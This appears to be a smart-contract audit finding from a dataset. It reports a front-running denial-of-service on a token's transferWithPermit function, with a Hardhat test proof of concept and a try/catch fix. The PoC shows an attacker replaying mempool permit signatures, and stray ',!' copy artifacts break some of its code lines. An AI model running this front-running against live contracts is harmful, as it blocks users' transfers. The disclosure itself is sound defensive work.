# [H] StandardToken::transferWithPermit DoS Attack

## Summary
Severity: High
Contest weight: 0.0000
Dataset id: 23352
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
StandardToken::transferWithPermit contains two calls:
• first to ERC20PermitMixin::permit
• second to the StandardToken::transferFrom

Impact: Since the permit signature and parameters are visible in the mempool before execution, an attacker can extract these values and front‑run the transaction by directly calling StandardToken::permit. This consumes the user's nonce causing the original call StandardToken::transferWithPermit to revert, making it impossible to atomically grant the approval and transfer the tokens.

## Proof of Concept
```javascript
it('front-running attack on transferWithPermit()', async () => {
    const [owner, spender, recipient, attacker] = await hre.ethers.getSigners();
    const { dsToken, registryService } = await loadFixture(deployDSTokenRegulated);
    const value = 100;
    const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
    // Owner creates a signature to allow spender to transfer tokens to recipient
    const message = {
        owner: owner.address,
        spender: spender.address,
        value,
        nonce: await dsToken.nonces(owner.address),
        deadline,
    };
    const { v, r, s } = await buildPermitSignature(owner, message, await dsToken.name(), await dsToken.getAddress());,!
    // Register investors and issue tokens to owner; see that the attacker is not even an ibnvestor
    // so it could be any address,!
    await registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_1, owner, registryService);
    await registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_2, recipient, registryService);
    await dsToken.issueTokens(owner, value);
    // ATTACK SCENARIO 1: Attacker front-runs by calling permit() directly
    await dsToken.connect(attacker).permit(owner.address, spender.address, value, deadline, v, r, s);,!
    // When the original transferWithPermit() executes, it FAILS
    // because the nonce has already been used
    await expect(
        dsToken.connect(spender).transferWithPermit(owner.address, recipient.address, value, deadline, v, r, s),!
    ).to.be.revertedWith('Permit: invalid signature');
});
```

## Recommendation
Recommended Mitigation: Use the try and catch pattern:
```solidity
function transferWithPermit(
    address from,
    address to,
    uint256 value,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s
) external returns (bool) {
    // Try to execute permit, but don't revert if it fails
    try this.permit(from, msg.sender, value, deadline, v, r, s) {
        // Permit succeeded
    } catch {
        // Permit failed (possibly due to front‑running or already executed)
        // Verify we have sufficient allowance to proceed
        require(allowance(from, msg.sender) >= value, "Insufficient allowance");
    }
    // Perform the actual transferFrom
    return transferFrom(from, to, value);
}
```
